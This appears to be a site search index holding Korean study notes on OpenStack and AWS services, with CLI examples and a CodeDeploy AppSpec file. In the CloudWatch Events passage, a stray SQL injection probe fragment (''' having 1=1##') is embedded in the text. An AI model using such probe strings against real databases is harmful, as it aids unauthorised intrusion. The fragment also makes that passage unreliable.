네트워크의 종류 기능     Management network OpenStack 구성 요소 간의 내부 통신에 사용, 기본적으로 IP 주소는 데이터 센터 내에서만 사용이 가능   Guest network 클라우드 배포 내에서 인스턴스 데이터 통신에 사용되며, 네트워킹 플러그인 및 테넌트가 만든 가상 네트워크의 구성 선택에 따라 변동   External network 외부에서 인스턴스에 대한 엑세스를 위해 제공되는 네트워크   API network OpneStack API를 외부에 노출시키는 네트워크       Neutron과 VRRP, DVR    VRRP(Virtual Router Redundancy Protocl)로 랜에서 정적으로 설정된 기본 라우터를 사용할 때, 하나 이상의 백업 라우터를 사용하는 방법을 제공하는 인터넷 프로토콜\n  DVR(Distributed Virtual Router)이란 VRRP 기능을 향상시키고, 분산 라우팅 기능과 HA(High Availability), 로드밸런싱 기능을 사용할 수 있음\n  기존 레거시 HA 라우터와 마찬가지로 DVR/ SNAT(Static NAT), HA 라우터는 다른 노드에서 실행되는 L3 Agent의 백업 DVR/ SNAT 라우터에서 SNAT 서비스 장애를 빠르게 해결 가능\n     네트워크 관련 명령어 $ openstack network list\r# 네트워크 확인\r$ openstack network show [네트워크 이름]\r# 네트워크 정보 조회\r$ ip netns\r# 라우터 정보 조회\r$ ip netns exec [라우터이름] [리눅스 명령어]\rnetstat -r\rarp -an\rifconfig\rping # 라우터의 자세한 정보 조회\r$ openstack network create --provider-network-type [타입] [네트워크 이름] # 네트워크 생성\r# openstack subnet create --network [네트워크 이름] --gateway [GW주소] --subnet-range [서브넷 범위] [서브넷 이름\r# 서브넷 생성\r$ openstack router list\r# 라우터 목록 확인\r$ openstack router show [라우터 이름]\r# 라우터 정보 조회\r$ openstack router add subnet [라우터 이름] [서브넷 이름]\r# 라우터에 서브넷 추가\r$ openstack port create --network [네트워크 이름] --fixed-ip subnet=[서브넷 이름] [포트 이름]\r# 포트 생성\r$ openstack router add port [라우터 이름] [포트 이름]\r# 라우터에 포트 추가\r fixed-ip, floating-ip     IP 역할     Fixed IP 가상머신에 할당되는 내부 IP를 의미   Floating IP 클라우드 내의 가상머신이 인터넷 외부망과 연결되기 위해 배정 받는 IP를 의미     Security Group   인스턴스에 대한 인바운드 및 아웃바운드 트래픽을 제어하는 가상의 네트워크 방화벽 하나의 인스턴스에 여러 개의 보안 그룹 적용도 가능       "});index.add({'id':60,'href':'/docs/programing/shell/shell-6/','title':"Shell 6",'content':"****    ****         #\n"});index.add({'id':61,'href':'/docs/cloudcomputing/awstraining/ami/','title':"AWS AMI 생성",'content':"AWS AMI 생성    저번 장에서는 EC2를 생성해보았습니다. 이번 Marketplace에서 AMI를 사용해서 인스턴스를 만들고, 생성한 인스턴스를 사용해서 AMI를 만들어 보도록하겠습니다. AMI에 대한 학습을 원하는 분들은 AWS AMI를 참고해주세요.    AWS AMI 생성      먼저 EC2 생성을 위해 인스턴스 시작을 클릭 합니다.      AMI 선택화면이 나오면 AWS Marketplace에서 CentOS를 입력 후, 선택합니다. 이와 같이 Marketplace에서는 사람들이 만들어둔 이미지를 사용할 수 있습니다. ( 단, 유료도 있으니 주의가 필요합니다. )      AMI를 선택 후, EC2를 생성합니다. 혹시 생성방법을 모르시는 분들은 EC2 생성 를 참조해주세요 인스턴스의 생성이 완료되면 퍼블릭 IP로 접속합니다.     $ sudo yum install -y httpd\r$ sudo systemctl enable httpd\r Apache 설치 및 자동시작을 등록합니다. 퍼블릭 IP로 접속하여 확인해보세요.      이제 AMI를 만들어보겠습니다. AWS Console 환경에서 AMI를 만들 인스턴스를 우 클릭 후, 이미지 -\u0026gt; 이미지 생성을 클릭합니다.      이미지 이름과 설명을 입력 후, 원하는 볼륨을 설정하여 이미지를 생성합니다.      메뉴바의 이미지에서 AMI를 클릭하면, 현재 만든 AMI를 확인할 수 있습니다.      만든 AMI의 상태가 available이 되면, 다시 인스턴스 생성으로 돌아와 AMI 선택에서 이번에는 AWS Marketplace가 아닌, 나의 AMI를 선택하여 생성합니다. 생성 후, 퍼블릭 IP로 접속하면 Apache가 설치되어 있는 것을 확인 할 수 있습니다.    이와 같이 AMI를 사용하면, 보다 편리하고 빠르개 인스턴스를 생성할 수 있습니다.     AWS CLI로 AMI 생성    AMI 또한 AWS CLI를 통해 생성이 가능합니다.   $ aws ec2 create-image \\\r--instance-id [ 인스턴스 ID ]\r--name \u0026#34;[ AMI 이름 ]\u0026#34;\r--description \u0026#34;[ AMI 설명 ]\u0026#34;\r# 인스턴스 ID를 가진 인스턴스를 AMI 이름과 AMI 설명을 가진 AMI 이미지로 생성합니다.\r$ aws ec2 describe-images \\\r--image-id [ AMI ID ]\r# AMI ID를 가진 AMI에 대한 정보를 알려줍니다.\r   예제 1. Ubuntu18.04의 OS에서 Apache2가 설치되어 있고, 자동시작되는 AMI를 생성해보세요. ( 단, Putty로 접속하여 설치하면 안됩니다. )  \r예제 1. 답안\r↕\r\r User data를 사용하여, 자동 설치 후 AMI를 생성합니다.\n\r\r\r\r "});index.add({'id':62,'href':'/docs/cloudcomputing/amazonwebservice/aws_developer/','title':"AWS Developer",'content':"AWS_Developer   AWS CodeBuild    AWS CodeBuild는 소스 코드를 컴파일하는 단계부터 테스트 실행 후 소프트웨어 패키지를 개발하여 배포하는 단계까지 마칠 수 있는 완전관리형의 지속적 통합 서비스 CodeBuild는 지속적으로 확장되며 여러 빌드를 동시에 처리 사전 패키징된 빌드 환경을 사용하면 신속하게 시작할 수 있으며 혹은 자체 빌드 도구를 사용하는 사용자 지정 빌드 환경제작 가능 AWS CodeBuild는 코드를 실행하고 아티팩트를 Amazon S3 버킷에 저장 CodeBuild에서는 사용한 컴퓨팅 리소스에 대한 분당 요금이 청구    AWS CodeCommit    AWS CodeCommit은 안전한 Git 기반 리포지토리를 호스팅하는 완전관리형 소스 제어 서비스 뛰어난 확장성의 안전한 에코시스템에서 여러 팀이 협업하여 코드 작업을 수행가능 CodeCommit을 사용하면 소스 코드에서 바이너리까지 모든 항목을 안전하게 저장할 수 있고 기존 Git 도구와 원활하게 연동   에코시스템\n 자연계의 생태계처럼 관련 기업이 협력하여 공생하는 시스템을 의미 IT 분야의 여러 기업이 몇몇 리더 기업을 중심으로 경쟁과 협력을 통해 공생하고 함께 발전해 나가는 모습을 지칭 \r\r   AWS CodeDeploy    AWS에서 제공하는 배포 자동화 서비스 EC2 인스턴스들에 코드를 배포하는 과정을 자동으로 진행시켜 줌 카피스트라노 ( Capistrano )나 젠킨스 ( Jenkins ) 같은 서드파티 배포 자동화도구 보다 AWS 내 다양한 서비스와 손쉽게 연동이 가능하다. CodeDeploy는 무중단 배포 기법들인 IDP/ BGD를 둘다 지원한다. CodeDeploy란 단순히 명령어를 적어두고 프로그램이 그 명령을 순차적으로 실행하는 것 뿐이다. 단순히 우리가 해주는 일을 대신 해주는 Auto Scaling과 같은 개념 CodeDeploy로 배포하고자 한다면 EC2 인스턴스에 반드시 설치되어 있어야 하며 *.yml파일에 있는 절차를 따라서 배포를 진행한다.   CodeDeploy 구성요소   \rAppSpec.yml\r↕\r\rvesion: 0.0\ros: linux\r# 윈도우, 리눅스 등 어떤 OS를 위한 배포 파일인지를 명시한다.\r# CodeDeploy Agent는 배포 명령을 받으면 코드 저장소에 있는 프로젝트 전체를 서버의 임시 결로로 내려 받는다.\r# 내려받은 프로젝트를 서버 내 어느 경로로 이동시킬지 명시할 수 있다.\rfiles:\r- source: /\rdestination: /var/www\r# AppSpec.yml에서는 배포 시 발생하는 다양한 생명주기마다 원하는 스크립트를 실행할 수 있게 후크를 제공해준다.\r# 배포 시 사용하는 스크립트들은 훤하는 곳에 둬도 되며, 보통은 프로젝트에 AppSpec.yml 파일을 포함하듯이 함께 포함한다.\r# 이 예시에서는 프로젝트 최상단에 scripts라는 디렉터리를 만들어 그 안에 스크립트들을 보관해 둔다.\rhooks:\r# 코드 저장소에서 프로젝트를 낼받은 뒤 인스턴스 내 배포를 원하느 경로에 파일들을 옮기기 전이며, 예시에서 사용한 스크립트의 이름을 보면 리소스 데이터 번들을 압축 해제하는 것으로 추축할 수 있다.\rBeforeInstall:\r- location: scripts/UnzipResourceBundle.sh\r- location: scripts/UnzipDataBundle.sh\r# 파일을 모두 이동한 후 실행되는 스크립트들이다.\r# 파일 이름을 봐서 리소스 파일들이 제대로 존재하는 지 테스트하는 것으로 추측할 수 있다.\r# 또한 Timeout 옵션을 두어 180초 이내에 스크립트가 완료되지 않으면 배포에 실패한 것으로 간주한다.\rAfterInstall:\r- location: scripts/RunResourceTests.sh\rtimeout: 180\r# 애플리케이션을 시작할 때 사용하는 스크립트들이다.\r# 예시에서는 서버를 재시작하고 최대 240초 동안 기다리는 것을 알 수 있다.\rApplicationStart:\r- location: scripts/RestartServer.sh\rtimeout: 240\r# 서비스를 재시작한 후 실제로 서비스가 올바르게 실행됐는 지 확인 할 때 사용한느 스크립트들이다.\r# runas 옵션을 주어 기본 사용자인 ec2-user가 아닌 codedeployuser라는 다른 user로 실행하게 했다.\rValidateService:\r- location: scripts/ValidateService.sh\rtimeout: 30\rrunas: codedeployuser\r\r\r\r\r   스크립트 파일들에 실행 권항을 추가해서 Git에 올리고 싶다면 다음과 같은 명령어를 이용하면 된다.  git update-index --chmod=+x \u0026lt;스크립트 파일 이름\u0026gt;\r \rCodeDeploy 작동절차\r...\r\r CodeDeploy 작동절차    AppSpec.yml 파일을 추가한 후, 프로젝트를 코드 저장소인 GitHub 혹은 AWS S3에 업로드한다.   CodeDeploy에 프로젝트의 특정 버전을 배포해 달라 요청한다.   CodeDeploy는 배포를 진행할 EC2 인스턴스들에 설치되어 있는 CodeDeploy Agent들과 통신하며 Agent들에게 요청받은 버전을 배포해 달라고 요청한다.   요청을 받은 CodeDeploy Agent들은 코드 저장소에서 프로젝트 전체를 서버로 내려받는다. 그리고 내려받은 프로젝트에 있는 AppSpec.yml 파일을 읽고 해당 파일에 적힌 절차대로 배포를 진행한다.   CodeDeploy Agent를 배포를 진행할 후 성공/ 실패 등 결과를 CodeDeploy에게 전달한다. \r\r\r\r   AWS CodePipeling    AWS CodePipeline은 빠르고 안정적인 애플리케이션 및 인프라 업데이트를 위해 릴리스 파이프라인을 자동화하는 데 도움이 되는 완전관리형 지속적 전달 서비스 코드 변경이 발생할 때마다 사용자가 정의한 릴리스 모델을 기반으로 릴리스 프로세스의 빌드, 테스트 및 배포 단계를 자동화 AWS CodePipeline을 GitHub 또는 자체 사용자 지정 플러그인과 같은 타사 서비스와 손쉽게 통합가능 사용한 만큼만 비용을 지불합니다. 선결제 금액이나 장기 약정이 존재하지 않음    AWS X-Ray    AWS X-Ray는 개발자가 마이크로 서비스 아키텍처를 사용해 구축된 애플리케이션과 같은 프로덕션 분산 애플리케이션을 분석하고 디버그하는 데 도움을 주는 서비스 X-Ray를 사용해 자신이 개발한 애플리케이션과 기본 서비스가 성능 문제와 오류의 근본 원인 식별과 문제 해결을 올바로 수행하는지 파악가능 X-Ray는 요청이 애플리케이션을 통과함에 따라 요청에 대한 엔드 투 엔드 뷰를 제공하고 애플리케이션의 기본 구성 요소를 맵으로 제시 3-티어 애플리케이션에서부터 수천 개의 서비스로 구성된 복잡한 마이크로 서비스 애플리케이션에 이르기까지 개발 중인 애플리케이션과 프로덕션에 적용된 애플리케이션 모두 분석가능  "});index.add({'id':63,'href':'/docs/cloudcomputing/openstack/cinder/','title':"Cinder",'content':"블록 스토리지 서비스 : Cinder   블록 스토리지 서비스 : Cinder   Cinder은 bloack storage 서비스로 storage를 가상화 시켜 여러 스토리지로 사용하거나, 공유할 수 있는 서비스 Cinder은 하나 이상의 노드에서 실행되도록 설계되었으며, SQL 기반 중앙 데이터베이스를 사용 Cinder은 집계 시스템을 사용하여 여러 데이터 저장소로 이동이 가능     Cinder 구성요소      구성요소 역할     DB 데이터저장을 위한 SQL 데이터베이스로, 모든 구성요소에서 사용   Web Dashboard API와 통신할 수 있는 외부 인터페이스   api http 요청을 받고 명령을 변환하여 대기열 또는 http를 통해 다른 구성요소와 통신   Auth Manager 사용자/ 프로젝트/ 역할에 따라, 리소스의 대한 허용을 결정   Scheduler 볼륨을 가져올 호스트를 결정   volume 동적으로 부착 가능한 블록 장치를 관리   backup 블록 저장 장치의 백업을 관리      외부 인터페이스인 dash-board에서 요청을 보내면, Cinder-api가 keyston에게 인증을 확인하기 위해 요청을 보낸다. 인증이 완료되면 DB를 읽어 알맞은 리소스를 생성, 혹은 할당하는 프로세스를 가진다.     Cinder의 논리 아키텍처      구성요소 역할     Cinder-api 요청에 따라 storage를 할당, 확장하는 기능을 수행   Queue 각 구성요소 간의 통신기능을 수행   Cinder database Cinder 서비스를 수행하기 위한 일련의 정보들은 보관, 관리하는 DB   cinder voulme Cinder 서비스를 통해 가상화되어진 Storage voulme, voulme을 관리 및 업데이트   volume provider storage volume을 생성, 확장하는 서비스   cinder scheduler 요청이 다수인 경우 큐를 통해 받은 메시지를 수행      Nova에서 생성된 인스턴스에서 확장해서 사용할 수 있는 저장 공간을 생성, 삭제하고 인스턴스에 연결 할 수 있는 기능을 제공 Cinder는 물리 하드 디스크를 LVM(Logical Volume Manager)으로 설정 설정된 LVM은 cinder-conf와 nova.conf의 환경을 설정해서 cinder-volume을 할당 cinder-api로 생성된 볼륨은 단일 인스턴스 또는 여러 인스턴스에 할당 할 수 있음     Cinder driver type   Cinder 기본 블록 스토리지 드라이버는 iSCSI 기반의 LVM  LVM이란 하드 디스크를 파티션 대신 논리 볼륨으로 할당하고, 디스크 여러 개를 좀 더 효율적이고 유연하게 관리할 수 있는 방식을 의미      블록 장치는 물리 볼륨으로 초기화해야 하며, 논리 볼륨으로 생성하려면 물리 볼륨을 볼륨 그룹으로 통합해야 함    "});index.add({'id':64,'href':'/docs/programing/shell/shell-7/','title':"Shell 7",'content':"****    ****         #\n"});index.add({'id':65,'href':'/docs/cloudcomputing/awstraining/eip/','title':"AWS Elastic IP 할당",'content':"AWS Elastic IP 할당   AWS Elastic IP ( 이하 EIP )란 인스턴스의 IP를 고정적으로 할당시킨 IP를 뜻합니다. 만약 인스턴스를 생성할 시, 퍼블릭 IP를 활성화 하면, 인스턴스를 자동 실행시마다 유동적으로 IP가 변화하여 문제가 되는 데, 이러한 문제들을 해결할 수 있습니다.    AWS Elastic IP 할당      EIP를 생성하기 위해 메뉴에서 EC2 서비스에서 네트워크 및 보안 -\u0026gt; 탄력적 IP를 선택합니다. 탄력적 IP 주소 할당을 클릭합니다.      Amazon의 IPv4 주소 풀로 할당 받습니다.      EIP의 생성이 완료되면, 할당을 위해 Actions -\u0026gt; EIP 주소 연결을 클릭합니다.      EIP의 연결 대상을 인스턴스 혹은 네트워크 인터페이스로 설정하여 연결을 진행합니다. 사실상, 인스턴스를 체크하여도 선택된 인스턴스의 네트워크 인터페이스에 EIP를 할당 하는 것입니다.      EIP를 할당한 인스턴스를 선택하면 퍼블릭 IP주소가 탄력적 IP로 바뀐 것을 확인할 수 있습니다.      EIP를 삭제하기 위해서는 EIP에 연결된 인터페이스가 없어야 하며, 삭제를 위해서는 EIP 주소 릴리스를 선택해줍니다.    프리티어에서도 EIP 한개의 사용이 무료이지만, 할당하고있는 EIP만 무료이며, 만약 할당받지 않은 채로 유지되면 과금이 부과되어 주의가 필요합니다.     AWS CLI로 EIP 할당   $ aws ec2 allocate-address\r EIP를 할당 받습니다.     $ aws ec2 associate-address \\\r--instance-id [ 인스턴스 ID ] \\\r--allocation-id [ EIP ID ]\r 인스턴스 ID를 가진 인스턴스에 EIP ID를 가진 EIP를 할당합니다.     "});index.add({'id':66,'href':'/docs/cloudcomputing/amazonwebservice/aws_management/','title':"AWS Management",'content':"AWS Management   Amazon CloudWatch    AWS 클라우드 리소스와 AWS에서 실행되는 애플리케이션을 위한 모니터링 서비스 리소스 및 애플리케이션에 대해 측정할 수 있는 변수인 지표를 수집하고 추적 가능 사용중인 모든 AWS 서비스에 대한 지표가 자동적으로 표시디며, 사용자 지정 대시보드를 통해 사용자 지정 애플리케이션에 대한 지표를 표시하고 지정 집합 표시 가능 지표는 Cloudwatch에 게시된 시간 순서별 데이터 요소 세트이며, 모니터링할 변수 ( 가령 EC2의 CPU 사용량은 EC2가 제공하는 하나의 지표 ) 기본 모니터링과 세부 모니터링으로 나뉘며, 가각 5분과 1분 주기로 수집함 기본 모니터링은 자동활성화이지만, 세부 모니터링은 선택사항 기본적으로 CPU, Network, Disk, Status Check 등을 수집 ( Memory 항목이 없음 ) 지표 데이터의 보존기간  기간 60초 미만의 경우, 3시간 기간 60초의 경우, 15일 기간 300초의 경우 63일 기간 3600초의 경우, 455일   AWS CLI 혹은 API를 이용하여, Cloudwatch에 사용자 정의 지표 게시 가능 경보기능을 사용하여 어떤 지표가 일정기간동안 일정값에 도달할 경우 각 서비스가 취해야할 행동을 정의할 수 있음 모니터링하기로 선택한 측정치가 정의한 임계값을 초과할 경우 하나 이상의자동화 작업을 수행하도록 구성 EC2의 경우, 경보에 따라, 인스턴스 중비, 복구, 종료, 재부팅 가능   Cloudwatch Agent  EC2에 Agent를 설치하게 되면 더 많은 시스템 수준 지표를 수집할 수 있음 온프레미스 서버 또한 Cloudwatch Agent 사용 가능 Memory 항목 포함 Cloudwatch Agent는 로그를 수집할 수 있으며, 후술할 Cloudwatch Logs 기능 사용 가능   Cloudwatch Logs  EC2( Agent에서 수집된 ), CloudTrail, Route 53, Route 53, VPC flow Log 등 기타 소스에서 발생한 로그 파일을 모니터링, 저장 및 엑세스하는 기능 Cloudwatch Agent를 사용하여 로그를 수집 Cloudwatch Log Insights를 사용하여 CloudWatch Logs에서 로그 데이터를 대화식으로 검색해 분석할 수 있음 Agent는 기본적으로 5초마다 로그 데이터를 전송   Cloudwatch Events  AWS 각 서비스의 이벤트가 사용자가 지정한 이벤트패턴과 일치하거나 일정이 트리거될 경우, 사용자가 월하는 기능을 발동시키도록 하는 기능 이번트 소스와 대상으로 나뉨 이벤트 소스: AWS 환경에서 발생하는 이벤트이며, 가령 S3의 경우 오브젝트 등록, 삭제 등을 들 수 있음 대상: 이벤트 발생시 해야할 행동을 정의하는 것이며, SNS 전송 혹은 람다, SQS 게시 등을 설정할 수 있음 이벤트 소스에 해당하는 규칙이 트리거될 경우 대상에 해당하는 서비스를 실행시킴 이벤트가 시스템에 생성해 둔 규칙과 일치하는 경우, AWS Lambda 함수를 자동으로 호출하고, 해당 이벤트를 Amazon Kinesis 스트림에 전달하고, Amazon SNS 주제를 알림\u0026rsquo; having 1=1##    AWS CloudFormation    인프라를 관리 간소화를 목적으로 하는 서비스 AWS의 리소스를 일일이 설정하지 않고 해당 서비스의 프로비져닝과 설정을 미리 구성하여 반복작업을 줄이도록 도와주는 역할 EC2, Auto Scaling Group으로부터 ELB, RDS, S3 등을 사전에 구성하여 한 번의 클릭으로 다수의 서비스를 빠르게 생성할 수 있음 생성된 리소스 모음은 다른 계정 혹은 다른 리전에 옮겨 사용 가능   Stack  하나의 단위로 관리할 수 있는 AWS 리소스들의 모음 스택을 생성, 업데이트 또는 삭제하여 리소스 모음을 생성, 업데이트, 삭제가 가능 스택에서 실행중인 리소스를 변경해야 하는 경우 스택을 업데이트할 수 있는 데, 이 업데이트된 세트를 변경세트라 칭함 스택을 삭제하는 경우 삭제할 스택을 지정하면 해당 스택과 스택 내 모든 리소스를 삭제 AWS에서 리소스를 삭제할 수 없는 경우 스택이 삭제 스택의 리소스 중 하나라도 성공적으로 생성되지 않은 경우 성공적으로 생성한 모든 리소스를 모두 삭제함 ( Automatic rollback on error )   Template   스택을 구성하는 AWS 리소스를 JSON 혹은 YAML 형식으로 선언한 텍스트 파일\n  템플릿은 로컬 혹은 S3에 저장되며, 템플릿을 불러올 때 S3 bucket을 지정할 수 있음\n  템플릿을 \u0026ldquo;Designer\u0026quot;을 통해 생성할 수도 있으며, S3 bucket에 저장된 것을 불러와 생성이 가능\n   Template의 여러 요소   Parameter : 선택 섹션, 스택 생성 및 업데이트 시 템플릿에 전달하는 값, 사용자가 선택하는 여러 요소들 ( EC2 유형 - t2.micro 등 )\n  Conditions : 선택 섹션, 조건문, 리소스가 생성되는 조건을 만들어 조건 충족시에만 리소스를 만들 수 있또록 하는 요소\n  Resources : 필수 섹션, CLoudformation에 포함될 리소스\n  Metadata : 선택 섹션, 템플릿에 대한 세부 정보를 제공하는 임의의 JSON, YAML 객체\n  Mappings : 선택 센셕, 프로그래밍 언어로 따지만 \u0026lsquo;Switch\u0026rsquo; 조건문에 해당하며, \u0026lsquo;키'에 해당하는 값 세트를 생성하고 해당하는 키가 있으면 값 세트에 맞춰 리소를 생성\n    AWS CloudTrail    CloudTrail의 이벤트는 AWS 계정에서의 활동 기록을 의미 용자, 역할 또는 CloudTrail에서 모니터링이 가능한 서비스에 의해 수행되는 작업, AWS Management 콘솔, AWS SDK, 명령줄 도구 및 기타 AWS 서비스를 통해 수행되는 API 계정 활동과 비 API 계정 활동 모두에 대한 기록을 제공 CloudTrail에는 로깅할 수 있는 두 가지 유형의 이벤트가 존재  관리 이벤트 : 기본적으로 로깅 데이터 이벤트 : 기본적으로 로깅을 하지 않음   관리 이벤트와 데이터 이벤트 모두 동일한 CloudTrail JSON 로그 형식을 사용   관리 이벤트  AWS 계정의 리소스에 대해 수행되는 관리 작업에 대한 정보를 제공하며, 이를 제어 영역 작업이라 함   관리 이벤트 예시\n 보안 구성 디바이스 등록 데이터 라우팅 규칙 구성 로깅 설정 \r\r  데이터 이벤트  데이터 이벤트는 리소스 상에서, 또는 리소스 내에서 수행되는 리소스 작업에 대한 정보를 제공하며, 이를 데이터 영역 작업이라 함   관리 이벤트 예시\n Amazon S3 객체 수준 API활동 AWS Lambda 함수 실행 활동 \r\r  Insights events  CloudTrail Insights 이벤트는 AWS 계정에서 비정상적인 활동을 캡처 Insights events을 활성화하고 CloudTrail가 비정상적인 활동을 감지한 경우, Insights events는 다른 폴더나 트레일에 대한 대상 S3 버킷의 접두사에 로깅 Insights events은 계정 API 사용량 변화가 계정의 일반적인 사용 패턴과 크게 다르다는 것을 CloudTrail가 감지한 경우에만 로깅   CloudTrail 이벤트 기록  CloudTrail 이벤트 기록은 CloudTrail 이벤트에 대한 지난 90일간의 기록으로 확인, 검색 및 다운로드가 가능 AWS Management 콘솔, AWS SDK, 명령줄 도구 및 기타 AWS 서비스를 통해 수행되는 AWS 계정 활동에 대한 가시성을 확보가능 CloudTrail 콘솔에서 어떤 열이 표시되는지를 선택하여 이벤트 기록 보기를 사용자 지정가능   추적  추적은 Amazon S3 버킷, CloudWatch Logs 및 CloudWatch 이벤트에 CloudTrail 이벤트를 제공할 수 있는 구성 추적을 사용하여 제공하고자 하는 CloudTrail 이벤트를 필터링하고, AWS KMS 키로 CloudTrail 이벤트 로그 파일을 암호화하며, 로그 파일 제공을 위해 Amazon SNS 알림을 설정이 가능   조직 추적  조직 추적은 조직의 마스터 계정과 모든 멤버 계정의 CloudTrail 이벤트를 동일한 Amazon S3 버킷, CloudWatch Logs 및 CloudWatch 이벤트에 전달할 수 있도록 하는 구성을 의미    AWS Config    AWS Config는 AWS 리소스 구성을 측정, 감사 및 평가할 수 있는 서비스 Config는 AWS 리소스 구성을 지속적으로 모니터링 및 기록하고, 원하는 구성을 기준으로 기록된 구성을 자동으로 평가    AWS OpsWorks    AWS OpsWorks는 Chef 및 Puppet의 관리형 인스턴스를 제공하는 구성 관리 서비스 Chef 및 Puppet은 코드를 사용해 서버 구성을 자동화할 수 있게 해주는 자동화 플랫폼 OpsWorks를 사용하면 Chef 및 Puppet을 통해 Amazon EC2 인스턴스 또는 온프레미스 컴퓨팅 환경 전체에서 서버가 구성, 배포 및 관리되는 방법을 자동가 가능    AWS Managed Services    AWS Managed Services(AMS)는 안전하고 규정을 준수하는 AWS Landing Zone을 제공하고 고객 대신 AWS를 운영하는 서비스 AWS Managed Services는 인프라를 유지 관리하기 위한 모범 사례를 구현하여 운영 오버헤드와 위험을 줄일 수 있도록 지원 AWS Managed Services는 변경 요청, 모니터링, 패치 관리, 보안, 백업 서비스 등과 같은 일반적인 활동을 자동화하고 인프라를 프로비저닝, 운영 및 지원하기 위한 전체 수명 주기 서비스를 제공   Landing Zone  검증된 엔터프라이즈 운영 모델이자 지속적인 비용 최적화 및 일상적인 인프라 관리 수단 \r\r   AWS Service Catalog    AWS Service Catalog를 사용하는 조직은 AWS에서 사용이 승인된 IT 서비스 카탈로그를 생성하고 관리하는 서비스 서비스에는 가상 머신 이미지, 서버, 소프트웨어 및 데이터베이스에서 멀티 티어 애플리케이션 아키텍처를 완성하는 모든 서비스가 포함 AWS Service Catalog를 사용하면 일반적으로 배포된 IT 서비스를 중앙에서 관리할 수 있고 일관된 거버넌스를 달성하고 규정 준수 요건을 충족하는 데 도움이 되는 동시에 사용자가 필요로 하는 승인된 IT 서비스만을 신속하게 배포가능   AWS Service Catalog의 핵심개념  Service Catalog  서비스 카탈로그는 하나의 AWS account에 종속됩니다. 관리자가 관리하며 하나 이상의 포트폴리오(Portfolios)를 포함   Administrtor  관리자는 서비스 카탈로그 안에 있는 프로덕트 포트폴리오(Portfolios of Products)를 업로드하고 관리   User  사용자는 서비스 카탈로그의 포털페이지를 접속하여 여러 포트폴리오를 찾아보고, 관심있는 프로덕트를 선택   Portal  포탈은 서비스 카탈로그의 창문(View)인데요, 특정 사용자가 접속할 수 있는 포트폴리오와 제품만 보여주도록 맞춤제작 가능   Portfolio  포트폴리오란 서비스 카탈로그 아래 버전관리 중인 프로덕트들의 모음   Product  프로덕트는 AWS리소스들의 모음 ( EC2 인스턴스, 애플리케이션 서버, 데이타베이스 )들로 이 단위 별로 프로덕트를 런치하고 관리      AWS TrustedAdvisor    AWS Trusted Advisor는 AWS 모범 사례에 따라 리소스를 프로비저닝하는 데 도움이 되도록 실시간 지침을 제공하는 온라인 도구   AWS TrustedAdvisro의 분석 카테고리 "});index.add({'id':67,'href':'/docs/cloudcomputing/openstack/ceilometer/','title':"Ceilometer",'content':"리소스를 사용량과 부하를 관리하는 서비스 : Ceilometer   리소스를 사용량과 부하를 관리하는 서비스 : Ceilometer    Ceilometer은 각 서비스들의 예상 부하에 따라 추가 작업과 노드를 관리하는 역할을 수행 클라우드에서 배포된 자원의 사용량과 성능을 측정해 사용자가 자원 상태를 모니터링 할 수 있는 기능을 제공 Ceilomete는 리버티 버전에서 기존에 알람 서비스를 하던 부분을 aodh로 분리      핵심 서비스 역할     Polling agent OpenStack 서비스를 폴링하고 미터를 빌드하도록 설계된 데몬 프로세스   Notification agent 메시지 큐에서 알림을 듣고 이벤트 및 샘플로 변환하며 파이프 라인 조치를 적용하도록 설계된 데몬 프로세스       Ceilometer로 표준화 및 수집 된 데이터는 다양한 대상으로 전송 Gnocchi는 이러한 스토리지 및 쿼리를 최적화하기 위해 시계열 형식으로 측정 데이터를 캡처하도록 개발 Aodh는 사용자 정의 규칙이 깨졋을 때 경고를 보낼 수 있는 경보 서비스 Ceilomter은 이와 같이 리소스를 감시 및 예상하여 다른 작업을 수행할 수 있도록 하는 서비스를 의미     데이터 수집    위의 그림과 같이 Polling agents에서 각 서비스들의 API의 리소스를 읽어 데이터를 수집 Notification agents는 Polling agents에서 수집한 데이터들을 토대로 Ceilomter 서비스 혹은 Events로 변환하는 역할을 수행     데이터 처리    수집된 데이터를 토대로 Notification bus를 통해 엔드 포인트로 재분배하여 이벤트 및 샘플로 처리하느 역할을 수행     데이터 요청    데이터의 요청은 수집된 자료들을 토대로 서로 데이터를 주고 받으며, Polling agents라는 클라우드 컨트롤러에서 처리되며, 여러 플러그인을 사용하여 데이터를 통신합니다.     데이터 처리 및 변형     위의 그림은 수집된 데이터를 수집, 분석 및 변형 배포하는 과정을 나타낸 그림으로 Ceilomter은 각 서비스들의 데이터를 수집하여, 변형시키는 여러 소스를 제공     OpenStack에서의 Ceilomter의 위치      구성요소 역할     Ceilometer-colletcor 중앙 관리서버에서 실행되며, Queue 모니터링 하는 서비스   Ceilometer-agent-notification ceilometer-collector와 함꼐 중앙 관리서버에서 실행, Queue를 이용해 이벤트와 미러링 데이터를 기록   Ceilometer-agent-compute 각 컴퓨팅 노드에 설치해서 실행, 자원 활용 통계로 사용   Ceilometer-account-central 중앙 관리 서버에서 실행, 인스턴스에 연결되지 않은 자원이나 컴퓨터 노드의 활용 가능한 자원 통계를 폴링   Ceilometer-alarm-evaluator 하나 이상의 중앙 관리 서버에서 실행, 슬라이딩 시간대에 임계 값을 추가할 때 발생하는 경보 시점을 결정   Ceilometer-alarm-nottifier 하나 이상의 중앙 관리 서버에서 실행되며, 샘플을 수집하는 임계 값 평가에 따라 알람을 설정   Ceilometer database 수집한 데이터를 저장할 Ceilometer 데이터 베이스   Ceilometer-api 하나 또는 그 이상의 중앙 관리 서버에서 실행되며 데이터베이스에서 데이터 엑세스를 제공      "});index.add({'id':68,'href':'/docs/cloudcomputing/microsoftazure/','title':"Microsoft Azure",'content':" 정리 중\n"});index.add({'id':69,'href':'/docs/programing/shell/shell-8/','title':"Shell 8",'content':"****    ****         #\n"});index.add({'id':70,'href':'/docs/cloudcomputing/awstraining/elb/','title':"AWS ELB ( 2 Tier ) 생성",'content':"AWS ELB 생성    이번 장에서는 생성된 인스턴스들을 로드밸런싱하는 방법에 대해 알아보도록 하겠습니다. ELB 또한 중요한 개념이니, ELB에 대한 학습을 원하는 분들은 AWS ELB를 참고해주세요.    AWS ELB 생성    ELB에 대한 생성 순서은 아래의 순서대로 진행합니다.   1. 인스턴스 생성\n2. 대상그룹 생성\n3. 로드 밸런서 생성\n  인스턴스 생성   먼저 기본 VPC에 가용영역 a와 c에 한 대씩, 총 두 대의 인스턴스를 생성해주세요. 보안 그룹은 80은 모두에게, 8009는 서로간만 통신이 가능하게 설정해주세요. 그 후, a,c 인스턴스에 Apach와 Tomcat을 설치 및 연동시켜주세요.   $ apt-get -y update\r$ apt-get -y 